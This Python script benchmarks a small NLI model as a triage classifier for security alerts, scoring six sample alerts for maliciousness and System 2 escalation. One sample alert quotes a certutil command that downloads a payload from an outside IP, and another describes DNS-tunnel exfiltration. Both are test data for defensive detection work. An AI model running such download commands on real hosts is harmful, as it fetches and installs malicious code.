"""Evaluate Small System 1 Decision Models (<100 Million Parameters) from Hugging Face.

Implements typed decision primitives:
  - choice: multi-class category selection
  - noul: calibrated boolean probability P(true) for true positive vs false positive
  - noul: escalation flag to determine whether System 2 multi-agent deliberation is needed
"""

from __future__ import annotations

import json
import os
import time
from pathlib import Path
from typing import Any, Dict, List

# Run 100% offline from local Hugging Face cache
os.environ["HF_HUB_OFFLINE"] = "1"
os.environ["TRANSFORMERS_OFFLINE"] = "1"

import torch
from transformers import AutoModelForSequenceClassification, AutoTokenizer


def load_decision_model(model_id: str):
    print(f"\n[+] Loading local model '{model_id}' from Hugging Face cache...")
    t0 = time.perf_counter()
    tokenizer = AutoTokenizer.from_pretrained(model_id, local_files_only=True)
    model = AutoModelForSequenceClassification.from_pretrained(model_id, local_files_only=True)
    model.eval()
    t_load = time.perf_counter() - t0
    
    param_count = sum(p.numel() for p in model.parameters())
    print(f"[+] Loaded '{model_id}' in {t_load:.2f}s")
    print(f"    - Parameter Count: {param_count:,} ({param_count / 1e6:.2f}M params)")
    print(f"    - Model Status: {'<100M parameter requirement MET' if param_count < 100_000_000 else 'Exceeds 100M'}")
    return tokenizer, model, param_count


class System1DecisionEngine:
    def __init__(self, tokenizer, model):
        self.tokenizer = tokenizer
        self.model = model
        # Find entailment and contradiction index for NLI decision models
        id2label = {i: l.lower() for i, l in self.model.config.id2label.items()}
        self.entailment_idx = next(i for i, l in id2label.items() if "entail" in l)
        self.contradiction_idx = next(i for i, l in id2label.items() if "contra" in l)

    def evaluate_noul(self, premise: str, hypothesis: str) -> float:
        """Evaluate a boolean decision question P(hypothesis is true | premise)."""
        inputs = self.tokenizer(premise, hypothesis, return_tensors="pt", truncation=True, max_length=512)
        with torch.no_grad():
            logits = self.model(**inputs).logits[0]
            # Pair entailment vs contradiction for calibrated boolean probability
            ent_contra_logits = torch.stack([logits[self.contradiction_idx], logits[self.entailment_idx]])
            probs = torch.softmax(ent_contra_logits, dim=0)
            p_true = float(probs[1].item())
            return p_true

    def evaluate_choice(self, premise: str, choices: Dict[str, str]) -> Dict[str, Any]:
        """Evaluate categorical choice questions over candidate hypotheses."""
        scores = {}
        for cat_name, hyp_template in choices.items():
            inputs = self.tokenizer(premise, hyp_template, return_tensors="pt", truncation=True, max_length=512)
            with torch.no_grad():
                logits = self.model(**inputs).logits[0]
                ent_contra_logits = torch.stack([logits[self.contradiction_idx], logits[self.entailment_idx]])
                p_true = float(torch.softmax(ent_contra_logits, dim=0)[1].item())
                scores[cat_name] = p_true
        
        # Softmax normalize over choices
        exp_scores = {k: torch.exp(torch.tensor(v * 3.0)).item() for k, v in scores.items()}
        total_exp = sum(exp_scores.values())
        norm_scores = {k: v / total_exp for k, v in exp_scores.items()}
        best_choice = max(norm_scores.items(), key=lambda x: x[1])
        return {
            "selected_choice": best_choice[0],
            "confidence": best_choice[1],
            "distribution": norm_scores,
        }

    def triage_alert(self, alert_description: str, metadata_context: str = "") -> Dict[str, Any]:
        premise = f"Security Event: {alert_description}. Context: {metadata_context}" if metadata_context else alert_description
        t0 = time.perf_counter()

        # 1. Evaluate Noul: Is this a malicious true positive attack?
        p_malicious = self.evaluate_noul(
            premise,
            "This event represents an active, unauthorized security threat or attack.",
        )

        # 2. Evaluate Noul: Is this an approved administrative false positive?
        p_approved = self.evaluate_noul(
            premise,
            "This event represents normal, authorized IT operations or scheduled administrative maintenance.",
        )

        # 3. Categorical choice
        choice_candidates = {
            "credential_attack": "The attacker is attempting unauthorized authentication, password spraying, or credential theft.",
            "malware_execution": "Malicious code, ransomware, or living-off-the-land utility was executed on the host.",
            "c2_exfiltration": "Suspicious outbound network traffic, data exfiltration, or command and control beaconing is occurring.",
            "network_recon": "An automated port scan or host discovery sweep is probing the network.",
            "authorized_admin": "This is legitimate IT administration, scheduled vulnerability assessment, or routine system backup.",
        }
        choice_result = self.evaluate_choice(premise, choice_candidates)

        latency_ms = (time.perf_counter() - t0) * 1000

        # Calibrated decision logic
        is_true_positive = p_malicious > p_approved and p_malicious > 0.40
        confidence = max(p_malicious, p_approved)

        # System 2 Escalation Policy:
        # High-confidence clear false positive -> Do not escalate (Auto-close)
        # Ambiguous (0.35 <= confidence <= 0.70) or High-Severity True Positive -> Escalate to LangGraph Multi-Agent
        escalate_to_system2 = is_true_positive or (0.35 <= confidence <= 0.65)

        return {
            "classification": "likely_true_positive" if is_true_positive else "likely_false_positive",
            "category": choice_result["selected_choice"],
            "category_confidence": round(choice_result["confidence"], 3),
            "p_malicious": round(p_malicious, 3),
            "p_approved": round(p_approved, 3),
            "escalate_to_system2": escalate_to_system2,
            "latency_ms": round(latency_ms, 2),
        }


def main():
    # Hugging Face models < 100M parameters
    # Primary: typeform/distilbert-base-uncased-mnli (66.9 Million parameters)
    model_id = "typeform/distilbert-base-uncased-mnli"
    
    tokenizer, model, param_count = load_decision_model(model_id)
    engine = System1DecisionEngine(tokenizer, model)

    test_cases = [
        {
            "id": "CASE-1-MALWARE",
            "type": "EDR Alert",
            "description": "Suspicious execution: certutil.exe -urlcache -split -f http://185.220.101.5/payload.bin payload.exe initiated by unknown parent process on ws-eng-402.",
            "expected": "likely_true_positive",
        },
        {
            "id": "CASE-2-BRUTE-FORCE",
            "type": "Authentication",
            "description": "Multiple failed Kerberos pre-authentication requests (Event 4625 sub-status 0xC000006A) targeting user charlie.admin from IP 185.220.101.5 followed by logon success.",
            "expected": "likely_true_positive",
        },
        {
            "id": "CASE-3-C2-TUNNEL",
            "type": "Network Flow",
            "description": "High entropy outbound DNS queries to nameserver ns1.evil-domain.ru transferring 850KB of base64 encoded chunks.",
            "expected": "likely_true_positive",
        },
        {
            "id": "CASE-4-NESSUS-SCAN",
            "type": "Network Scan",
            "description": "Routine scheduled Nessus vulnerability assessment scanner 10.0.1.15 sweeping internal development subnet across TCP ports 80, 443, 8080.",
            "expected": "likely_false_positive",
        },
        {
            "id": "CASE-5-BACKUP-SERVICE",
            "type": "Process Execution",
            "description": "VeeamAgent.exe volume snapshot shadow copy creation during scheduled midnight enterprise database backup on db-prod-02.",
            "expected": "likely_false_positive",
        },
        {
            "id": "CASE-6-USER-TYPO",
            "type": "Authentication",
            "description": "Single bad password attempt for alice.smith from corporate workstation ws-hr-104 followed immediately by successful MFA verification.",
            "expected": "likely_false_positive",
        },
    ]

    print("\n=========================================================================================")
    print(f"  SYSTEM 1 DECISION MODEL BENCHMARK (<100M Parameters)")
    print(f"  Model: {model_id} | Parameters: {param_count:,} ({param_count/1e6:.1f}M)")
    print("=========================================================================================\n")

    results = []
    correct_count = 0

    for tc in test_cases:
        res = engine.triage_alert(tc["description"])
        is_correct = (res["classification"] == tc["expected"])
        if is_correct:
            correct_count += 1
            
        print(f"Test Case: [{tc['id']}] ({tc['type']})")
        print(f"  Description:  {tc['description'][:90]}...")
        print(f"  Expected:     {tc['expected']}")
        print(f"  Predicted:    {res['classification']} (Category: {res['category']} @ {res['category_confidence']*100:.1f}%)")
        print(f"  Probabilities: P(malicious) = {res['p_malicious']:.3f} | P(approved) = {res['p_approved']:.3f}")
        print(f"  Escalate to System 2 Agents: {res['escalate_to_system2']}")
        print(f"  Inference Latency: {res['latency_ms']:.2f} ms")
        print(f"  Match:        {'[PASS]' if is_correct else '[FAIL]'}")
        print("-" * 85)
        results.append({**tc, **res, "match": is_correct})

    accuracy = (correct_count / len(test_cases)) * 100
    avg_latency = sum(r["latency_ms"] for r in results) / len(results)

    print(f"\n=========================================================================================")
    print(f"  SUMMARY RESULTS")
    print(f"  Model Parameter Count:     {param_count:,} ({param_count/1e6:.2f}M params - <100M)")
    print(f"  Classification Accuracy:   {accuracy:.1f}% ({correct_count}/{len(test_cases)})")
    print(f"  Average Decision Latency:  {avg_latency:.2f} ms")
    print("=========================================================================================\n")

    # Save results to benchmarks/
    out_path = Path("benchmarks/small_decision_model_eval.json")
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump({
            "model_id": model_id,
            "parameter_count": param_count,
            "accuracy": accuracy,
            "avg_latency_ms": avg_latency,
            "results": results
        }, f, indent=2)
    print(f"Full evaluation saved to: {out_path}")


if __name__ == "__main__":
    main()
